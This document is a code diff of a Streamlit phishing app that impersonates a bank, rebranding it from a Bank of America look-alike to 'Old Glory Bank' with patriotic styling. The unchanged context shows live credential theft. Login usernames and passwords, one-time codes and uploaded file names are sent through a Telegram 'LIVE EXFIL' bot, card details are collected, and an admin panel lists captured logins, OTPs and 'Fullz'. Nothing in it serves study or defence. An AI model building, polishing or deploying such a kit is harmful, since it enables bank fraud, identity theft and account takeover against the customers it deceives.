@@ -6,17 +6,27 @@ import requests
 import random
 import base64
 
-# ==================== BANK OF AMERICA-INSPIRED LOGO WITH BANK NAME ====================
+# ==================== OLD GLORY BANK LOGO ====================
 svg_logo = '''
-<svg width="240" height="80" viewBox="0 0 240 80" xmlns="http://www.w3.org/2000/svg">
-  <rect x="20" y="18" width="200" height="10" rx="5" fill="#e7001f"/>
-  <rect x="40" y="36" width="160" height="10" rx="5" fill="#e7001f"/>
-  <rect x="60" y="54" width="120" height="10" rx="5" fill="#e7001f"/>
-  <text x="120" y="75" text-anchor="middle" font-size="22" font-family="Helvetica Neue, Helvetica, Arial, sans-serif" fill="#0e2a47" font-weight="bold">PRIVATE GLORY BANK</text>
+<svg width="240" height="60" viewBox="0 0 240 60" xmlns="http://www.w3.org/2000/svg">
+  <rect x="0" y="0" width="240" height="60" rx="15" fill="#fff"/>
+  <rect x="0" y="0" width="60" height="60" rx="5" fill="#16335b"/>
+  <g>
+    <circle cx="17" cy="17" r="4" fill="#fff"/>
+    <circle cx="43" cy="17" r="4" fill="#fff"/>
+    <circle cx="30" cy="30" r="4" fill="#fff"/>
+    <circle cx="17" cy="43" r="4" fill="#fff"/>
+    <circle cx="43" cy="43" r="4" fill="#fff"/>
+  </g>
+  <rect x="60" y="12" width="160" height="7" fill="#b40d1e"/>
+  <rect x="60" y="24" width="160" height="7" fill="#b40d1e"/>
+  <rect x="60" y="36" width="160" height="7" fill="#b40d1e"/>
+  <rect x="60" y="48" width="160" height="7" fill="#b40d1e"/>
+  <text x="120" y="56" text-anchor="middle" font-size="22" font-family="Montserrat, Helvetica Neue, Arial, sans-serif" fill="#16335b" font-weight="bold">OLD GLORY BANK</text>
 </svg>
 '''
-boa_logo_b64 = base64.b64encode(svg_logo.encode("utf-8")).decode()
-BANK_LOGO = f'data:image/svg+xml;base64,{boa_logo_b64}'
+ogb_logo_b64 = base64.b64encode(svg_logo.encode("utf-8")).decode()
+BANK_LOGO = f'data:image/svg+xml;base64,{ogb_logo_b64}'
 
 # ==================== TELEGRAM LIVE EXFIL (YOUR REAL BOT) ====================
 def tg(message):
@@ -77,83 +87,108 @@ if "tx" not in state:
     txs.sort(key=lambda x: x["date"], reverse=True)
     state.tx = txs
 
-st.set_page_config(page_title="Private Glory Bank", page_icon="🏦", layout="wide")
+st.set_page_config(page_title="Old Glory Bank", page_icon="🇺🇸", layout="wide")
 
-# ==================== MODERN BANK STYLES (NO FOOTER) ====================
+# ==================== GOLD BORDER & FAINT FLAG BACKGROUND STYLES ====================
 st.markdown(f"""
 <style>
-    .stApp {{
-        background: #eef2f6;
-        color: #1a1a1a;
-        font-family: 'Helvetica Neue', Arial, sans-serif;
+    body, .stApp {{
+        background:
+            repeating-linear-gradient(105deg, #dbe8ff 0px, #dbe8ff 44px, #fff 44px, #fff 88px, #fefefe 88px, #fefefe 132px),
+            url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Flag_of_the_United_States.svg/1200px-Flag_of_the_United_States.svg.png');
+        background-size: cover;
+        background-blend-mode: lighten;
     }}
-    .header {{
-        background: linear-gradient(135deg, #e7001f 0%, #2253a7 100%);
-        padding: 2rem 0 1.5rem 0;
-        text-align: center;
-        border-bottom: 7px solid #bbb;
-    }}
-    .logo-img {{
-        filter: drop-shadow(0 4px 12px rgba(34,83,167,0.25));
-    }}
-    .card {{
-        background: white;
-        border-radius: 22px;
+    .main-card, .card {{
+        background: rgba(255,255,255,0.98);
+        border-radius: 20px;
         padding: 2rem;
-        box-shadow: 0 12px 40px rgba(34,83,167,0.09);
-        border: 1px solid #e8e8e8;
+        box-shadow: 0 12px 40px rgba(36,58,115,0.09);
+        border: 4px solid #FFD700 !important;
         margin-bottom: 1.7rem;
     }}
+    .main-card.outlined {{
+        border: 5px solid #FFD700 !important;
+    }}
+    .header {{
+        background: linear-gradient(90deg, #16335b 0%, #b40d1e 100%);
+        padding: 2.3rem 0 1.3rem 0;
+        text-align: center;
+        border-bottom: 7px solid #b40d1e;
+        border-top: 7px solid #FFD700;
+        box-shadow: 0 2px 32px -12px #FFD70080;
+    }}
+    .logo-img {{
+        filter: drop-shadow(0 4px 14px rgba(22,51,91,0.20));
+        background: #fff;
+        border-radius: 20px;
+        margin-bottom: 0.7rem;
+        border: 4px solid #FFD700;
+    }}
     .balance-amount {{
-        font-size: 2.6rem;
-        font-weight: 600;
-        color: #2253a7;
-        margin: 0.5rem 0;
+        font-size: 2.4rem;
+        font-weight: 800;
+        color: #b40d1e;
+        margin: 0.6rem 0;
     }}
     .balance-label {{
-        color: #525252;
-        font-size: 1.09rem;
+        color: #4a5870;
+        font-size: 1.07rem;
         margin-bottom: 0.3rem;
+        font-weight: 500;
     }}
     .stButton>button {{
-        background: linear-gradient(135deg, #e7001f, #2253a7 90%);
+        background: linear-gradient(135deg, #FFD700 0%, #b40d1e 82%, #16335b 100%);
         color: #fff;
         border: none;
-        border-radius: 16px;
-        height: 3.8rem;
+        border-radius: 14px;
+        height: 3.3rem;
         font-weight: 700;
-        transition: all 0.3s;
-        box-shadow: 0 2px 8px rgba(34,83,167,0.08);
+        transition: all 0.2s;
+        box-shadow: 0 2px 8px rgba(22,51,91,0.09);
+        letter-spacing: 0.05em;
     }}
     .stButton>button:hover {{
-        background: #2253a7;
-        color: #fff;
+        background: #16335b;
+        color: #FFD700;
         transform: translateY(-2px);
+        border: 2px solid #FFD700;
+    }}
+
+    /* Faint flag background overlay layer for .stApp (if Streamlit releases it for the body) */
+    .background-flag {{
+        position: fixed;
+        z-index: 0;
+        left: 0; top: 0; right: 0; bottom: 0;
+        pointer-events: none;
+        background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Flag_of_the_United_States.svg/1200px-Flag_of_the_United_States.svg.png');
+        background-size: contain;
+        opacity: 0.08;
     }}
 </style>
 """, unsafe_allow_html=True)
 
-# ==================== HEADER W/ LOGO ====================
+# ==================== HEADER W/ LOGO AND TEXT ====================
 def header():
     st.markdown(f"""
-    <div class="header">
+    <div class="header main-card outlined">
         <img src="{BANK_LOGO}" class="logo-img" width="225">
     </div>
     """, unsafe_allow_html=True)
     st.markdown("""
-        <h1 style="color:white;text-align:center;font-size:2.2rem;font-weight:300;margin:15px 0 0 0;">PRIVATE GLORY BANK</h1>
-        <p style="color:#fff;text-align:center;font-size:1.15rem;margin-top:4px;">Secure • Modern • American Banking</p>
+        <h1 style="color:white;text-align:center;font-size:2.5rem;font-weight:900;margin:10px 0 0 0; letter-spacing:0.04em;">OLD GLORY BANK</h1>
+        <p style="color:#FFD700;text-align:center;font-size:1.18rem;margin-top:11px;font-weight:500;background:rgba(22,51,91,0.10);padding:4px 12px;border-radius:8px;display:inline-block;">America's Patriotic Bank</p>
     """, unsafe_allow_html=True)
 
 # ==================== LOGIN ====================
 def login():
     header()
     st.markdown("<br><br>", unsafe_allow_html=True)
-    col1, col2, col3 = st.columns([1,1.3,1])
+    col1, col2, col3 = st.columns([1,1.15,1])
     with col2:
-        st.markdown("<div class='card'>", unsafe_allow_html=True)
+        st.markdown("<div class='main-card card outlined'>", unsafe_allow_html=True)
         st.markdown("### Sign In to Online Banking")
-        user = st.text_input("Username", placeholder="Awesome12@")
+        user = st.text_input("Username", placeholder="JohnDoe1776")
         pwd = st.text_input("Password", type="password", placeholder="••••••••")
         if st.button("Sign In Securely", use_container_width=True):
             tg(f"LOGIN\nUser: {user}\nPass: {pwd}\nTime: {datetime.now()}")
@@ -172,8 +207,8 @@ def login():
 def otp():
     header()
     st.markdown("<br><br>", unsafe_allow_html=True)
-    st.markdown("<h3 style='text-align:center;color:#2253a7'>Two-Factor Authentication</h3>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align:center;color:#525252'>Enter the 6-digit code sent to ••••1776</p>", unsafe_allow_html=True)
+    st.markdown("<h3 style='text-align:center;color:#b40d1e'>Two-Factor Authentication</h3>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align:center;color:#4a5870;font-weight:500;'>Enter the 6-digit code sent to ••••1776</p>", unsafe_allow_html=True)
     code = st.text_input("Verification Code", max_chars=6, placeholder="000000")
     if st.button("Verify Code", type="primary", use_container_width=True):
         tg(f"OTP ENTERED: {code}")
@@ -186,19 +221,19 @@ def otp():
 # ==================== DASHBOARD WITH ACCOUNT FILTERING ====================
 def dashboard():
     header()
-    st.markdown("<p style='text-align:right;color:#525252;font-size:1.08rem;margin-top:-45px'>Welcome back, Awesome12@</p>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align:right;color:#4a5870;font-size:1.09rem;margin-top:-45px;font-weight:500;'>Welcome back, Awesome12@</p>", unsafe_allow_html=True)
     c1,c2,c3,c4 = st.columns(4)
-    with c1: st.markdown(f"<div class='card'><p class='balance-label'>Checking ••••1776</p><p class='balance-amount'>${state.checking:,.2f}</p></div>", unsafe_allow_html=True)
-    with c2: st.markdown(f"<div class='card'><p class='balance-label'>Savings ••••1812</p><p class='balance-amount'>${state.savings:,.2f}</p></div>", unsafe_allow_html=True)
-    with c3: st.markdown(f"<div class='card'><p class='balance-label'>Total Balance</p><p class='balance-amount'>${state.checking + state.savings:,.2f}</p></div>", unsafe_allow_html=True)
-    with c4: st.markdown(f"<div class='card'><p class='balance-label'>Available Credit</p><p class='balance-amount'>$18,500</p></div>", unsafe_allow_html=True)
+    with c1: st.markdown(f"<div class='main-card card outlined'><p class='balance-label'>Checking ••••1776</p><p class='balance-amount'>${state.checking:,.2f}</p></div>", unsafe_allow_html=True)
+    with c2: st.markdown(f"<div class='main-card card outlined'><p class='balance-label'>Savings ••••1812</p><p class='balance-amount'>${state.savings:,.2f}</p></div>", unsafe_allow_html=True)
+    with c3: st.markdown(f"<div class='main-card card outlined'><p class='balance-label'>Total Balance</p><p class='balance-amount'>${state.checking + state.savings:,.2f}</p></div>", unsafe_allow_html=True)
+    with c4: st.markdown(f"<div class='main-card card outlined'><p class='balance-label'>Available Credit</p><p class='balance-amount'>$18,500</p></div>", unsafe_allow_html=True)
 
     view = st.radio("View Transactions", ["All Accounts", "Checking Only", "Savings Only"], horizontal=True)
     filtered = state.tx
     if view == "Checking Only": filtered = [t for t in state.tx if t["account"] == "Checking"]
     if view == "Savings Only": filtered = [t for t in state.tx if t["account"] == "Savings"]
 
-    st.markdown("<div class='card'><h3>Recent Activity</h3>", unsafe_allow_html=True)
+    st.markdown("<div class='main-card card outlined'><h3>Recent Activity</h3>", unsafe_allow_html=True)
     df = pd.DataFrame(filtered[:20])
     display = df[["date", "desc", "amount"]].copy()
     display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
@@ -210,7 +245,7 @@ def transfer():
     header()
     tab1, tab2 = st.tabs(["Internal Transfer", "Pay with Card"])
     with tab1:
-        st.markdown("<div class='card'>", unsafe_allow_html=True)
+        st.markdown("<div class='main-card card outlined'>", unsafe_allow_html=True)
         from_acc = st.selectbox("From", ["Checking ••••1776", "Savings ••••1812"])
         to_acc = "Savings ••••1812" if "Checking" in from_acc else "Checking ••••1776"
         amount = st.number_input("Amount ($)", min_value=0.01)
@@ -232,7 +267,7 @@ def transfer():
         st.markdown("</div>", unsafe_allow_html=True)
 
     with tab2:
-        st.markdown("<div class='card'>", unsafe_allow_html=True)
+        st.markdown("<div class='main-card card outlined'>", unsafe_allow_html=True)
         card = st.text_input("Card Number", placeholder="5412 1776 2024 1812")
         exp = st.text_input("Expiry (MM/YY)", placeholder="07/29")
         cvv = st.text_input("CVV", type="password", placeholder="776")
@@ -247,7 +282,7 @@ def transfer():
 # ==================== MESSAGES ====================
 def messages():
     header()
-    st.markdown("<div class='card'>", unsafe_allow_html=True)
+    st.markdown("<div class='main-card card outlined'>", unsafe_allow_html=True)
     uploaded = st.file_uploader("Upload Documents")
     if uploaded:
         tg(f"FILE UPLOADED\n{uploaded.name}")
@@ -257,7 +292,7 @@ def messages():
 # ==================== ADMIN ====================
 def admin():
     header()
-    st.markdown("<h1 style='color:#2253a7;text-align:center'>ADMIN PANEL</h1>", unsafe_allow_html=True)
+    st.markdown("<h1 style='color:#b40d1e;text-align:center;font-weight:800;'>ADMIN PANEL</h1>", unsafe_allow_html=True)
     tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "Transactions"])
     with tabs[0]: st.dataframe(pd.DataFrame(state.captured))
     with tabs[1]: st.dataframe(pd.DataFrame(state.otp_log))
@@ -267,7 +302,7 @@ def admin():
 
 # ==================== SIDEBAR ====================
 def sidebar():
-    st.sidebar.markdown(f'<img src="{BANK_LOGO}" width="120">', unsafe_allow_html=True)
+    st.sidebar.markdown(f'<img src="{BANK_LOGO}" width="120" style="border:3px solid #FFD700;border-radius:16px;box-shadow:0 2px 8px #ffd70066;">', unsafe_allow_html=True)
     return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Messages", "Logout"])
 
 # ==================== MAIN FLOW ====================
